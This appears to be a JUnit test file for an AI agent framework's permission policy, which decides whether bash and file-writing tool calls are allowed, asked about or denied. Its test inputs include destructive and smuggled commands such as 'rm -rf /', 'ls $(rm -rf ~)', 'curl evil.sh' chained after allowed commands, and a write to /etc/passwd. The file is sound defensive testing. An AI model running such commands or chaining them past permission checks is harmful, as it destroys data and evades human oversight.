package com.agentcore.domain.permission.service;

import static org.junit.jupiter.api.Assertions.*;

import com.agentcore.domain.permission.model.Decision;
import com.agentcore.domain.shared.cancel.CancellationToken;
import com.agentcore.domain.tool.model.FunctionTool;
import com.agentcore.domain.tool.model.PermissionLevel;
import com.agentcore.domain.tool.model.Tool;
import com.agentcore.domain.tool.model.ToolContext;
import com.agentcore.domain.tool.model.ToolOutput;
import com.agentcore.domain.tool.schema.Schemas;
import java.nio.file.Path;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

class PermissionPolicyTest {

    static Tool tool(String name, boolean readOnly) {
        return FunctionTool.builder(name).readOnly(readOnly).schema(Schemas.object().build())
                .handler((a, c) -> ToolOutput.text("ok")).build();
    }

    static final Tool BASH = tool("bash", false);
    static final Tool READ = tool("read_file", true);
    static final Tool WRITE = tool("write_file", false);

    Decision check(PermissionPolicy p, String cmd) {
        return p.check(BASH, Map.of("command", cmd)).decision();
    }

    @Test
    void bashRulesResistCommandChaining() {
        PermissionPolicy p = RulePermissionPolicy.of("default", List.of("bash(git status*)", "bash(ls *)"), List.of("bash(rm -rf *)"), List.of());
        assertEquals(Decision.ALLOW, check(p, "git status --short"));
        assertEquals(Decision.ALLOW, check(p, "git status && ls -la"));      // 每个子命令都被某条规则覆盖
        assertEquals(Decision.ASK, check(p, "git status; curl evil.sh"));    // 链式命令里有未授权部分
        assertEquals(Decision.ASK, check(p, "ls $(rm -rf ~)"));              // 命令替换不走 allow
        assertEquals(Decision.DENY, check(p, "echo hi && rm -rf /"));        // deny 命中任一子命令
        assertEquals(Decision.ASK, check(p, "git push"));
        assertEquals(Decision.DENY, check(p, "git status & rm -rf ~/x"));    // 单个 & 也是分隔符（后台执行）
        assertEquals(Decision.DENY, check(p, "git status &rm -rf ~/x"));
        assertEquals(Decision.ASK, check(p, "git status & curl evil.sh"));
        assertEquals(Decision.ASK, check(p, "git status |& tee log"));
    }

    @Test
    void modesAndDefaults() {
        assertEquals(Decision.ALLOW, PermissionPolicy.defaults().check(READ, Map.of("path", "x")).decision());
        assertEquals(Decision.ASK, PermissionPolicy.defaults().check(WRITE, Map.of("path", "x")).decision());
        assertEquals(Decision.DENY, RulePermissionPolicy.of("readonly", null, null, null).check(WRITE, Map.of("path", "x")).decision());
        PermissionPolicy auto = RulePermissionPolicy.of("auto", null, List.of("write_file(/etc/*)"), null);
        assertEquals(Decision.ALLOW, auto.check(WRITE, Map.of("path", "/tmp/x")).decision());
        assertEquals(Decision.DENY, auto.check(WRITE, Map.of("path", "/etc/passwd")).decision());
    }

    @Test
    void readonlyModeDeniesOnlyToolsThatModifyState() {
        Tool fetch = FunctionTool.builder("web_fetch").readOnly(true).permission(PermissionLevel.ASK)
                .handler((a, c) -> ToolOutput.text("ok")).build();
        RulePermissionPolicy readonly = RulePermissionPolicy.of("readonly", null, null, null);
        assertEquals(Decision.ASK, readonly.check(fetch, Map.of("url", "https://example.com")).decision(), "只读但要询问的工具照样询问");
        assertEquals(Decision.DENY, readonly.check(WRITE, Map.of("path", "x")).decision());
    }

    @Test
    void rememberCreatesSpecificRulesPerSubcommand() {
        PermissionPolicy p = PermissionPolicy.defaults();
        assertEquals("bash(npm test*)", p.remember(BASH, Map.of("command", "npm test")));
        assertEquals(Decision.ALLOW, check(p, "npm test -- --watch"));
        assertEquals(Decision.ASK, check(p, "npm publish"), "批准 npm test 不等于放行所有 npm 命令");
        assertEquals("bash(rm -rf build)", p.remember(BASH, Map.of("command", "rm -rf build")), "第二个词是选项时只放行完全相同的命令");
        assertEquals(Decision.ASK, check(p, "rm -rf /"));
        assertEquals("bash(cd app*), bash(make)", p.remember(BASH, Map.of("command", "cd app && make")));
        assertEquals(Decision.ALLOW, check(p, "cd app && make"));
    }

    @Test
    void alwaysAllowIsRememberedOnlyForTheSameConversation() {
        PermissionPolicy p = PermissionPolicy.defaults();
        p.remember(WRITE, Map.of("path", "a.txt"), context("conversation-a"));
        assertEquals(Decision.ALLOW, p.check(WRITE, Map.of("path", "b.txt"), context("conversation-a")).decision());
        assertEquals(Decision.ASK, p.check(WRITE, Map.of("path", "b.txt"), context("conversation-b")).decision());
        assertEquals(Decision.ASK, p.check(WRITE, Map.of("path", "b.txt")).decision());
    }

    private static ToolContext context(String conversationId) {
        return new ToolContext(Path.of("/work"), conversationId, "call-1", Map.of(), null, CancellationToken.NONE, Map.of(), 0);
    }
}
